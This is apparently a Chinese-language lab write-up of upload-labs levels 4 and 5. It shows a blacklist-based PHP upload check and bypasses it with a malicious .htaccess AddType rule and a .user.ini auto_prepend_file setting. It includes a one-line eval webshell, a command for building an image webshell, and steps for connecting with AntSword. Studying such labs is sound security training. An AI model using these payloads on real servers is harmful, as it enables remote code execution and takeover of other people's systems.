## 第四关_`.htaccess绕过`
---

### 题目


```php
$deny_ext = array("...一堆黑名单，漏了 `.htaccess`");

$file_name = trim($_FILES['upload_file']['name']);
$file_name = deldot($file_name); // 删除文件名末尾的点
$file_ext = strrchr($file_name, '.'); // 以最后一个点作为分割，获取文件后缀
$file_ext = strtolower($file_ext); // 转小写
$file_ext = str_ireplace('::$DATA', '', $file_ext); // 去除字符串::$DATA
$file_ext = trim($file_ext); // 首尾去空

if (!in_array($file_ext, $deny_ext)) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = UPLOAD_PATH . '/' . date("YmdHis") . rand(1000, 9999) . $file_ext;
    if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
    } else {
        $msg = '上传出错';
    }
} else {
    $msg = '不允许上传.asp, .aspx, .php, .jsp后缀文件';
}
```


### HOW
---

-  **上传 `.htaccess` 文件**

```apache
AddType application/x-httpd-php .jpg
```
> 该指令让 Apache 将同级目录下的所有 `.jpg` 文件当作 PHP 解析执行

-  **上传图片马 `000.jpg`**

    - `copy 111.php + 111.jpg /b 000.jpg`

-  在新标签页打开 `000.jpg`，复制 URL 至蚁剑连接即可


### Maybe
---

如果上传 `.htaccess` 后仍无法生效，可能是 Apache 主配置文件禁止了 `.htaccess`

1. 打开 `httpd.conf`
2. 搜索 `AllowOverride`
3. 将其值修改为 `ALL`
4. 重启 Apache



## 第五关 · `.user.ini绕过`
---
### 题目


```php
$deny_ext = array("...一堆黑名单，漏了 `.user.ini`");

$file_name = trim($_FILES['upload_file']['name']);
$file_name = deldot($file_name); // 删除文件名末尾的点
$file_ext = strrchr($file_name, '.'); // 以最后一个点作为分割，获取文件后缀
$file_ext = strtolower($file_ext); // 转小写
$file_ext = str_ireplace('::$DATA', '', $file_ext); // 去除字符串::$DATA
$file_ext = trim($file_ext); // 首尾去空

if (!in_array($file_ext, $deny_ext)) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = UPLOAD_PATH . '/' . date("YmdHis") . rand(1000, 9999) . $file_ext;
    if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
    } else {
        $msg = '上传出错';
    }
} else {
    $msg = '不允许上传.asp, .aspx, .php, .jsp后缀文件';
}
```


### HOW
---


1. 上传 `.user.ini` 文件
```ini
# 访问 任意一个 PHP 文件 时，PHP 会 自动先把 111.jpg 这个文件当成 PHP 代码执行一遍
auto_prepend_file=111.jpg
```

2. 上传 `111.jpg`
```php
<?php @eval($_POST['cmd']); ?>
```

3. 上传成功后，访问该目录下**任意已有的 `.php` 文件**（如`/upload/readme.php`）即可

### 前提条件

- 切换 PHP 版本为 **`php-7.0.12-nts + Apache`**
- 目录中**必须存在一个可被访问的 `.php` 文件**（蚁剑连接的就是它）
- PHP 版本 ≥ 5.3.0
- 服务器以 CGI / FastCGI / PHP-FPM 模式运行

### `php.ini` 中的控制项

`.user.ini` 的生效行为可通过 `php.ini` 配置：

| 配置项                  | 默认值         | 说明                                                     |
| -------------------- | ----------- | ------------------------------------------------------ |
| `user_ini.filename`  | `.user.ini` | 分布式配置文件的文件名。改为其他名称后（如 `.user.inn`），原本的 `.user.ini` 将失效 |
| `user_ini.cache_ttl` | 300         | 配置缓存时间（秒），设为 0 可禁用                                     |
| `user_ini.enabled`   | 1           | 设为 0 或空值可完全禁用 `.user.ini` 功能                           |



## 四类配置文件对比

| |`.htaccess`|`httpd.conf`|`.user.ini`|`php.ini`|
|---|---|---|---|---|
|**定位**|Apache 分布式配置文件|Apache 主配置文件|PHP 用户级配置文件|PHP 全局配置文件|
|**作用范围**|当前目录及其子目录|整个服务器|当前目录及其子目录|所有 PHP 请求|
|**优先级**|较高，可覆盖主配置|较低|较高，可覆盖 `php.ini`|较低|
|**生效方式**|修改后**立即生效**|需要管理员权限，**重启生效**|修改后**立即生效**|**重启** PHP 或 Web 服务器|
|**存放位置**|网站根目录或特定目录|Apache 安装目录|Web 应用根目录|PHP 安装目录|

**加载顺序：** 先加载全局配置（`php.ini` / `httpd.conf`），处理请求时再检查当前目录下的用户级配置（`.user.ini` / `.htaccess`），如有则**覆盖**对应配置项。
